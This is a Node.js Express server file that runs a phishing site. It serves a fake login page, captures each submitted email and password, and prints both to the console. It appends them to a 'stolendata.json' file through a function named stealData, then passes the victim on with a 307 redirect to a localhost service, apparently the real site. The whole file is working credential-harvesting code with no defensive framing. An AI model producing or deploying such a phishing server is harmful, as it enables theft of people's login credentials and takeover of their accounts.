var config = require('config');
var fs = require('fs'); //for modifying html values
var jsonFile = require('jsonfile');
var querystring = require('querystring');
var http = require('http');

var express = require('express');
var bodyParser = require('body-parser');
var app = express();
app.set('port', 3000);

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false })); 

app.use('/', express.static(__dirname + '/phishingpublic'));
app.use('/css', express.static(__dirname + '/phishingcss'));
app.use('/js', express.static(__dirname + '/phishingjs'));



////////////////////////////////////////////////////////
//----------------------------------------------------//
////////////////////////////////////////////////////////
app.get('/', (req, res) => {
	res.redirect('/login');
});

app.get('/login', (req, res) => {
	res.sendFile(__dirname + '/phishingpublic/login.html');
});




////////////////////////////////////////////////////////
//----------------------------------------------------//
////////////////////////////////////////////////////////
var stealDataFile = './stolendata/stolendata.json';
var userList;

app.post('/signin', (req, res) => {
	console.log(req.body.email);
	console.log(req.body.password);

	stealData(req, res);
});

function stealData(req, res) {
	var email = req.body.email;
	var password = req.body.password;

	var obj = {Email: email, Password: password};
 
	jsonFile.writeFile(stealDataFile, obj, {flag: 'a'}, function (err) {
  		console.error(err)
	});

    res.redirect(307, 'http://localhost:8080' + req.path);
};


////////////////////////////////////////////////////////
//----------------------------------------------------//
////////////////////////////////////////////////////////
// Listen for requests
app.listen(app.get('port'), function() {
    console.log('Listening on port 3000');
});